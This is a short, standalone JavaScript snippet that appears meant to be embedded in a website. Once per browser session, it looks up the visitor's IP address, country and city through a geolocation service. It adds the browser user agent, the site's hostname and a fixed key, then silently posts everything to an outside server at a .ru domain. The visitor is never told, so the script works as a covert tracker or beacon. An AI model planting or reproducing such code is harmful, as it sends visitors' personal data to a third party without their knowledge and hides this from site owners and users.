(() => {

	let check = (sessionStorage['ua']) ? sessionStorage['ua'] : false;

	if(check)
		return false; 

	sessionStorage['ua'] = 1;

	var params = {};

	$.getJSON('http://gd.geobytes.com/GetCityDetails?callback=?', data => {
		params.clIp = data['geobytesipaddress'];
		params.clCn = data['geobytescountry'];
		params.clCt = data['geobytescity'];
		params.clUa = window.navigator.userAgent;
		params.svDm = window.location.hostname;
		params.svkey = "b37954d59afe71d195f621e59f8c6be0";

		$.ajax({
		    type: "POST",
		    url: "http://security.karanikola.ru/demo.php",
	        data: params
		});	

	});

})($)